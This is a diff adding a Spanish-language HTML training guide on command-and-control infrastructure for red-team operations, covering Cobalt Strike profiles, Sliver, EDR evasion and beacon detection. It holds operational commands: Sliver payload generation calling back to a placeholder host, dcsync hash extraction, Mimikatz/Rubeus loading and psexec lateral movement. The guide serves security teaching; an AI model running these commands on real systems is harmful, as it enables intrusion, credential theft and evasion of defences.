@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Manual Avanzado de C2 - THE HACKERS LABS</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;900&family=JetBrains+Mono:wght@400;700&display=swap');
+        
+        :root {
+            --accent: #3b82f6;
+            --bg: #020617;
+            --card-bg: #0f172a;
+            --border: #1e293b;
+        }
+
+        body { 
+            font-family: 'Inter', sans-serif; 
+            background-color: var(--bg);
+            color: #94a3b8;
+            line-height: 1.8;
+            -webkit-print-color-adjust: exact !important;
+            print-color-adjust: exact !important;
+        }
+
+        h1, h2, h3, h4 {
+            color: #fff;
+            font-weight: 800;
+            letter-spacing: -0.025em;
+        }
+
+        .highlight { color: var(--accent); }
+
+        code, pre {
+            font-family: 'JetBrains Mono', monospace;
+            background: #020617;
+            color: #60a5fa;
+            padding: 0.2rem 0.4rem;
+            border-radius: 6px;
+            font-size: 0.85em;
+        }
+
+        pre {
+            display: block;
+            padding: 1.5rem;
+            margin: 1.5rem 0;
+            overflow-x: auto;
+            border: 1px solid var(--border);
+            border-left: 4px solid var(--accent);
+            white-space: pre-wrap;
+            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.3);
+        }
+
+        .section-card {
+            background: var(--card-bg);
+            border: 1px solid var(--border);
+            border-radius: 1.5rem;
+            padding: 2.5rem;
+            margin-bottom: 3rem;
+            break-inside: avoid;
+            page-break-inside: avoid;
+        }
+
+        @page {
+            margin: 1.5cm;
+            size: A4;
+        }
+
+        @media print {
+            body { background: #020617 !important; color: #94a3b8 !important; }
+            .no-print { display: none !important; }
+            .content-container { max-width: 100% !important; width: 100% !important; margin: 0 !important; }
+            .section-card { 
+                background: #0f172a !important; 
+                border: 1px solid #1e293b !important; 
+                margin-bottom: 2rem;
+                padding: 2rem;
+            }
+            pre { 
+                background: #020617 !important; 
+                color: #60a5fa !important; 
+                border: 1px solid #1e293b !important;
+            }
+            .print-page-break { page-break-before: always; }
+        }
+
+        .exclusive-tag {
+            border: 1px solid var(--accent);
+            color: var(--accent);
+            padding: 0.5rem 1rem;
+            display: inline-block;
+            text-transform: uppercase;
+            font-weight: 900;
+            font-size: 0.7rem;
+            letter-spacing: 0.15em;
+            border-radius: 4px;
+        }
+
+        .command-badge {
+            background: rgba(59, 130, 246, 0.1);
+            color: var(--accent);
+            padding: 2px 8px;
+            border-radius: 4px;
+            font-size: 0.75rem;
+            font-weight: bold;
+            text-transform: uppercase;
+        }
+    </style>
+</head>
+<body class="antialiased">
+
+    <div class="no-print fixed bottom-8 right-8 z-50 flex flex-col gap-3">
+        <div class="bg-blue-600/10 border border-blue-500/20 p-4 rounded-2xl backdrop-blur-md text-xs text-blue-400 max-w-[220px]">
+            <strong>Sugerencia:</strong> Para el PDF, selecciona "Guardar como PDF" y escala al 100%.
+        </div>
+        <button onclick="window.print()" class="bg-blue-600 hover:bg-blue-700 text-white font-black py-4 px-8 rounded-full shadow-2xl flex items-center justify-center gap-3 transition-all active:scale-95">
+            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path><polyline points="7 10 12 15 17 10"></polyline><line x1="12" y1="15" x2="12" y2="3"></line></svg>
+            DESCARGAR GUÍA MAESTRA C2
+        </button>
+    </div>
+
+    <div class="content-container max-w-5xl mx-auto py-12 px-6 md:px-12">
+        
+        <header class="mb-20 pt-12">
+            <div class="exclusive-tag mb-8">Exclusive Skool Access</div>
+            <h1 class="text-6xl md:text-8xl mb-8 leading-none uppercase tracking-tighter">ENTIENDE COMO FUNCIONA UN <span class="highlight">C2</span></h1>
+            <p class="text-2xl text-slate-400 max-w-3xl mb-12 font-light">
+                Arquitectura avanzada de Mando y Control, elusión de EDRs mediante perfiles maleables y gestión de implantes en operaciones de Red Team de élite.
+            </p>
+            <div class="flex flex-wrap gap-12 items-center">
+                <div class="h-1 w-32 bg-blue-600"></div>
+                <div class="text-sm font-bold uppercase tracking-widest text-slate-500">
+                    The Hackers Labs • Comunidad Skool • v2.0 (Deep Dive)
+                </div>
+            </div>
+        </header>
+
+        <!-- SECCIÓN 1: CONCEPTOS AVANZADOS -->
+        <section class="section-card">
+            <h2 class="text-3xl mb-6 border-l-4 border-blue-600 pl-6 uppercase tracking-tight">01. Anatomía Técnica de la Infraestructura C2</h2>
+            <p class="mb-6 text-slate-300 italic">"El C2 es el sistema nervioso de una intrusión. Sin una comunicación robusta, la operación muere."</p>
+            
+            <h3 class="text-xl font-bold mb-4 highlight">A. Team Server: El Cerebro</h3>
+            <p class="mb-4 text-sm">A diferencia de una simple shell reversa, el Team Server gestiona el estado de múltiples agentes. Implementa bases de datos para persistir logs, gestionar la compartición de sesiones entre varios operadores y actuar como repositorio de artefactos maliciosos.</p>
+            
+            <h3 class="text-xl font-bold mb-4 highlight">B. El Implante (Beacon/Sliver): El Huésped</h3>
+            <p class="mb-4 text-sm">Es código altamente optimizado (a menudo escrito en C o Go) que se inyecta en la memoria del host. No utiliza sockets persistentes para evitar detecciones de red por "long-lived connections", sino que emplea el **Beaconing**: conexiones cortas e intermitentes para solicitar comandos.</p>
+
+            <h3 class="text-xl font-bold mb-4 highlight">C. Redirectores Multicapa</h3>
+            <p class="mb-4 text-sm">Para proteger el Team Server (que contiene toda la inteligencia de la operación), se sitúan **Redirectores** (Nginx/Apache). Estos filtran peticiones basándose en el User-Agent o encabezados HTTP específicos, redirigiendo a los analistas de seguridad a una web legítima y a los agentes al Team Server real.</p>
+        </section>
+
+        <!-- SECCIÓN 2: COBALT STRIKE DEEP DIVE -->
+        <section class="section-card">
+            <h2 class="text-3xl mb-6 border-l-4 border-blue-600 pl-6 uppercase tracking-tight">02. Cobalt Strike: Dominio de Perfiles Maleables</h2>
+            <p class="mb-6">La potencia de Cobalt Strike reside en su capacidad de **Mimetismo**. Un analista de Blue Team que no encuentre un patrón conocido no generará una alerta.</p>
+
+            <h3 class="text-xl font-bold mb-4 highlight">A. Estructura de un Perfil Maleable</h3>
+            <p class="mb-4 text-sm">El perfil define cómo el Beacon se comporta en la red y en la memoria. Parámetros como <code>sleep</code> y <code>jitter</code> controlan el tiempo, mientras que <code>http-stager</code> define cómo se descarga el payload inicial.</p>
+            <pre>
+<span class="command-badge">Malleable C2 Profile</span>
+set sleep "30000"; # 30 segundos
+set jitter "20";    # +/- 20% de variabilidad
+
+process-inject {
+    set allocator "NtMapViewOfSection";
+    set min_alloc "16384";
+    set userwx    "false"; # Evita páginas de memoria con permisos Read-Write-Execute (RWX)
+}
+
+stage {
+    set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36...";
+    set cleanup   "true"; # Borra el stager de la memoria tras ejecución
+}</pre>
+
+            <h3 class="text-xl font-bold mb-4 highlight">B. Comandos de Post-Explotación Avanzada</h3>
+            <pre>
+<span class="command-badge">Cobalt Strike Console</span>
+# Enumeración de red sin tocar el disco (usando .NET en memoria)
+execute-assembly /path/to/SharpView.exe Get-DomainUser
+
+# Crear una sesión interactiva via SMB (Pivotaje interno)
+link [hostname]
+
+# Extracción de hashes mediante dcsync (requiere privilegios de admin de dominio)
+dcsync [domain] [user]</pre>
+        </section>
+
+        <div class="print-page-break"></div>
+
+        <!-- SECCIÓN 3: SLIVER C2 ARMORY -->
+        <section class="section-card">
+            <h2 class="text-3xl mb-6 border-l-4 border-blue-600 pl-6 uppercase tracking-tight">03. Sliver C2: El Arsenal Moderno</h2>
+            <p class="mb-6">Sliver es disruptivo porque implementa **mTLS** por defecto, asegurando que ni siquiera un analista con un Proxy SSL pueda interceptar los comandos entre el servidor y el agente.</p>
+            
+            <h3 class="text-xl font-bold mb-4 highlight">A. Generación de Cargas Útiles Complejas</h3>
+            <p class="mb-4 text-sm">Sliver permite generar no solo ejecutables, sino también **Shellcodes** para inyectar en otros procesos o servicios de Windows para persistencia sigilosa.</p>
+            <pre>
+<span class="command-badge">Sliver CLI</span>
+# Generar shellcode para inyección remota
+generate --mtls 1.2.3.4 --format shellcode --save ./sc.bin
+
+# Generar un servicio de Windows malicioso
+generate --http 1.2.3.4 --as-service --save ./svc.exe</pre>
+
+            <h3 class="text-xl font-bold mb-4 highlight">B. El "Armory" y Extensiones</h3>
+            <p class="mb-4 text-sm">Sliver posee un sistema de extensiones llamado **Armory**. Permite descargar dinámicamente herramientas como Mimikatz, Rubeus o BloodHound directamente a la sesión del agente sin que toquen el disco duro de la víctima.</p>
+            <pre>
+<span class="command-badge">Sliver Session</span>
+# Instalar y ejecutar una extensión del Armory
+armory install ghostpack
+rubeus -command "triage"
+
+# Movimiento lateral mediante WMI
+psexec -u [user] -p [pass] -d [binary_path] [target_ip]</pre>
+        </section>
+
+        <!-- SECCIÓN 4: EVASIÓN DE MEMORIA -->
+        <section class="section-card">
+            <h2 class="text-3xl mb-6 border-l-4 border-blue-600 pl-6 uppercase tracking-tight">04. Sigilo de Memoria: Sleep Masking</h2>
+            <p class="mb-6">Los EDRs modernos escanean la memoria RAM buscando patrones de C2 conocidos mientras el agente está "durmiendo".</p>
+            
+            <h3 class="text-xl font-bold mb-4 highlight">A. ¿Qué es el Sleep Masking?</h3>
+            <p class="mb-4 text-sm">Es una técnica donde el agente **se cifra a sí mismo** justo antes de entrar en el estado de "Sleep". Cuando despierta, se descifra, ejecuta los comandos recibidos y vuelve a cifrarse. Esto hace que las firmas estáticas en memoria sean inútiles.</p>
+
+            <h3 class="text-xl font-bold mb-4 highlight">B. Call Stack Spoofing</h3>
+            <p class="mb-4 text-sm">Los agentes C2 suelen tener un "Call Stack" (pila de llamadas) que delata que han sido inyectados (por ejemplo, llamadas a funciones de red que provienen de regiones de memoria desconocidas). El **Spoofing** falsea esta pila para que parezca que las peticiones provienen de DLLs legítimas de Windows como <code>kernel32.dll</code>.</p>
+        </section>
+
+        <!-- SECCIÓN 5: PROTOCOLOS DE COMUNICACIÓN -->
+        <section class="section-card">
+            <h2 class="text-3xl mb-6 border-l-4 border-blue-600 pl-6 uppercase tracking-tight">05. Protocolos de Transporte y Tunelización</h2>
+            <p class="mb-6">Un C2 profesional debe ser capaz de "hablar" múltiples protocolos para adaptarse a las restricciones del entorno.</p>
+
+            <div class="grid md:grid-cols-2 gap-6 mb-8">
+                <div class="p-5 bg-slate-900/50 rounded-2xl border border-slate-700">
+                    <h4 class="font-bold mb-2 highlight">DNS Tunneling</h4>
+                    <p class="text-xs text-slate-400 italic">"El puerto 53 casi siempre está abierto."</p>
+                    <p class="text-xs mt-3">Los datos se envían en subdominios de peticiones DNS TXT. Es lento pero extremadamente difícil de bloquear sin romper la navegación de la empresa.</p>
+                </div>
+                <div class="p-5 bg-slate-900/50 rounded-2xl border border-slate-700">
+                    <h4 class="font-bold mb-2 highlight">HTTP/2 y TLS 1.3</h4>
+                    <p class="text-xs text-slate-400 italic">"Escondido en el tráfico web."</p>
+                    <p class="text-xs mt-3">Utiliza cifrado de última generación y multiplexación para que el tráfico parezca una sesión de navegación normal hacia un servicio en la nube.</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- SECCIÓN 6: DETECCIÓN (BLUE TEAM) -->
+        <section class="section-card">
+            <h2 class="text-3xl mb-6 border-l-4 border-blue-600 pl-6 uppercase tracking-tight">06. Caza de Beacons: Perspectiva de Defensa</h2>
+            <p class="mb-6 text-sm text-slate-400">Como Blue Team, buscamos anomalías que el atacante no puede ocultar completamente.</p>
+            
+            <h3 class="text-xl font-bold mb-4 highlight">A. Análisis de Entropía en Memoria</h3>
+            <p class="mb-4 text-sm">Los procesos cifrados tienen una entropía muy alta. El uso de herramientas como **Moneta** o **HollowsHunter** permite detectar regiones de memoria sospechosas que no coinciden con archivos en disco.</p>
+
+            <h3 class="text-xl font-bold mb-4 highlight">B. Detección de Beacons mediante Red</h3>
+            <pre>
+<span class="command-badge">Blue Team Intel</span>
+# Buscar beacons recurrentes en logs de firewall (Análisis de Fourier)
+# Patrón: Conexión cada X segundos +/- jitter
+# IP Destino con baja reputación o dominio recién creado.</pre>
+        </section>
+
+        <footer class="mt-20 py-12 border-t border-slate-800 flex flex-col items-center text-center">
+            <div class="exclusive-tag mb-6">Confidential - THL Red Team Intelligence</div>
+            <p class="text-slate-500 text-sm max-w-lg mb-8 italic">
+                Este manual constituye la base técnica para la comprensión de infraestructuras de mando y control modernas. El conocimiento aquí expuesto es para fines estrictamente éticos.
+            </p>
+            <p class="text-white font-black tracking-[0.5em] text-3xl uppercase">The Hackers Labs</p>
+            <div class="mt-6 text-[10px] font-mono text-slate-800">
+                INT-CODE: 0x992B-C2-ARCHITECTURE-MASTERY-V2
+            </div>
+        </footer>
+
+    </div>
+
+</body>
+</html>
